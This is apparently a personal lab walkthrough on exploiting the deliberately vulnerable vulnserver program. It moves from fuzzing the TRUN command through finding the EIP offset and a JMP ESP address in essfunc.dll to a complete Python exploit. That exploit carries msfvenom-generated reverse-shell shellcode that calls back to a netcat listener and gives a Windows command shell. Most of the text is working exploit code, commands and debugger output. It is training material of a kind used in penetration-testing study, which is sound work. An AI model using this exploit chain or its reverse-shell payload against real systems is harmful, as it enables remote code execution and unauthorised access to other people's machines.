# Exploiting vulnserver

* Get vulnserver and Immunity Debugger
* Run vulnserver as administrator and immunity also as administrator, attach to process, click play

* Connecting

``` bash
nc -nv 192.168.50.206 9999
```

* Play with the server, the idea is to attack the commands with a buffer overflow - get data into EIP

* Trying with stats.spk

``` bash
s_readline();
s_string("STATS ");
s_string_variable("0");
generic_send_tcp 192.168.50.206 9999 ./stats.spk 0 0
```
stats is not throwing anything

* Tring with trun.spk

``` bash
s_readline();
s_string("TRUN ");
s_string_variable("0");
generic_send_tcp 192.168.50.206 9999 ./trun.spk 0 0
```

Trun is crashing the server!

* Writing our python script to programmatically crash the server:

``` python
#!/usr/bin/python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.50.206',9999))

        s.send(('TRUN /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + buffer
        print "Running at %s bytes" % str(len(buffer))
    except:
        print "Crashed at %s bytes" % str(len(buffer))
        sys.exit()
```

* The server crashes at 12800, getting a payload:

``` bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 12800
```

* Replacing the payload in the following script:

``` python
#!/usr/bin/python
import sys, socket

payload = “”
try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.50.206',9999))
    s.send(('TRUN /.:/' + payload))
    s.close()

except:
    print "Crashed at %s bytes" % str(len(buffer))
    sys.exit()
```

* Getting the payload offset from the EIP in Immunity Debugger: 386F4337

* Finding the offset:

``` bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 12800 -q 386F4337
[*] Exact match at offset 2003
```

* Rewriting our previous script, EIP starts with 2003, let’s test it:

``` python
#!/usr/bin/python
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.50.206',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close()

except:
    print "Crashed at %s bytes" % str(len(buffer))
    sys.exit()
```

* EIP: 42424242 - nice, we control EIP!

* Looking at badchars
<https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/>

* Edit the previous script with the badchars included, without the null charecter - remove \x00 from the list:

``` bash
shellcode = "A" * 2003 + "B" * 4 + badchars
```

* Run the script. In ID, right click on ESP and select Follow in Dump

There is nothing wrong, the values are in order: 01 02 03 04 …

* Running mona.py

Get mona.py from https://github.com/corelan/mona and put in in Immunity Debugger PyCommands folder in Program Files.  
In the bottom text box of the Imunnity Debugger, write “!mona modules” and hit enter.  
Look for all false in some dlls, meaning no memory protection - for example essfunc.dll  

* How to find opcode - pointer to jump to malicious shellcode

``` bash
locate nasm_shell
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
00000000  FFE4              jmp esp
```

* In ID, run

``` shell
!mona find -s "\xff\xe4" -m essfunc.dll

0BADF00D       - Number of pointers of type '"\xff\xe4"' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
625011BB     0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
625011C7     0x625011c7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
625011D3     0x625011d3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
625011DF     0x625011df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
625011EB     0x625011eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
625011F7     0x625011f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
62501203     0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
62501205     0x62501205 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\user\Downloads\vulnserver\essfunc.dll)
```

* Back to the py script, we try first address - 625011AF, notice that it’s in reverse, because of the little endian format.
It will hit a jump point in the EIP.  

``` python
shellcode = "A" * 2003 + "\xaf\x11\x50\x62"
```

* In ID, click the blue arrow - Enter expression to follow - 625011AF
Click on it (JMP ESP) - first line - and hit F2 to put a break point  
Click play  
Run the py script  

* We hit the break point!
EIP 625011AF essfunc.625011AF

* Let’s generate some shellcode and get root
-b is where you put bad characters

``` bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.79 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

Check payload size, you might need to tweak this.

* On the py, script:

``` python
overflow = (
 "\xd9\xcf\xba\x51\x9a\xb8\x26\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x53\x17\x83\xc3\x04\x03\x02\x89\x5a\xd3\x58\x45\x18"
"\x1c\xa0\x96\x7d\x94\x45\xa7\xbd\xc2\x0e\x98\x0d\x80\x42\x15"
"\xe5\xc4\x76\xae\x8b\xc0\x79\x07\x21\x37\xb4\x98\x1a\x0b\xd7"
"\x1a\x61\x58\x37\x22\xaa\xad\x36\x63\xd7\x5c\x6a\x3c\x93\xf3"
"\x9a\x49\xe9\xcf\x11\x01\xff\x57\xc6\xd2\xfe\x76\x59\x68\x59"
"\x59\x58\xbd\xd1\xd0\x42\xa2\xdc\xab\xf9\x10\xaa\x2d\x2b\x69"
"\x53\x81\x12\x45\xa6\xdb\x53\x62\x59\xae\xad\x90\xe4\xa9\x6a"
"\xea\x32\x3f\x68\x4c\xb0\xe7\x54\x6c\x15\x71\x1f\x62\xd2\xf5"
"\x47\x67\xe5\xda\xfc\x93\x6e\xdd\xd2\x15\x34\xfa\xf6\x7e\xee"
"\x63\xaf\xda\x41\x9b\xaf\x84\x3e\x39\xa4\x29\x2a\x30\xe7\x25"
"\x9f\x79\x17\xb6\xb7\x0a\x64\x84\x18\xa1\xe2\xa4\xd1\x6f\xf5"
"\xcb\xcb\xc8\x69\x32\xf4\x28\xa0\xf1\xa0\x78\xda\xd0\xc8\x12"
"\x1a\xdc\x1c\xb4\x4a\x72\xcf\x75\x3a\x32\xbf\x1d\x50\xbd\xe0"
"\x3e\x5b\x17\x89\xd5\xa6\xf0\x76\x81\x9a\x4f\x1f\xd0\xda\x5e"
"\x83\x5d\x3c\x0a\x2b\x08\x97\xa3\xd2\x11\x63\x55\x1a\x8c\x0e"
"\x55\x90\x23\xef\x18\x51\x49\xe3\xcd\x91\x04\x59\x5b\xad\xb2"
"\xf5\x07\x3c\x59\x05\x41\x5d\xf6\x52\x06\x93\x0f\x36\xba\x8a"
"\xb9\x24\x47\x4a\x81\xec\x9c\xaf\x0c\xed\x51\x8b\x2a\xfd\xaf"
"\x14\x77\xa9\x7f\x43\x21\x07\xc6\x3d\x83\xf1\x90\x92\x4d\x95"
"\x65\xd9\x4d\xe3\x69\x34\x38\x0b\xdb\xe1\x7d\x34\xd4\x65\x8a"
"\x4d\x08\x16\x75\x84\x88\x36\x94\x0c\xe5\xde\x01\xc5\x44\x83"
"\xb1\x30\x8a\xba\x31\xb0\x73\x39\x29\xb1\x76\x05\xed\x2a\x0b"
"\x16\x98\x4c\xb8\x17\x89")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + overflow
```

Explanation: we’re setting shellcode to 2003 bytes to get to the EIP, then hit the pointer address 625011AF which is a JMP address and we jump to instructions (overflow).  
We need to insert noops (padding) between the jump command and the overflow code. Check size!  

``` python
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
```

* Running netcat:

``` bash
nc -nvlp 4444
```

* Run vulnserver.exe again, run the py

``` shell
listening on [any] 4444 ...
connect to [192.168.50.79] from (UNKNOWN) [192.168.50.206] 50202
Microsoft Windows [Version 10.0.18363.778]
(c) 2019 Microsoft Corporation. All rights reserved.
C:\Users\user\Downloads\vulnserver>
```

## Great, we have root shell
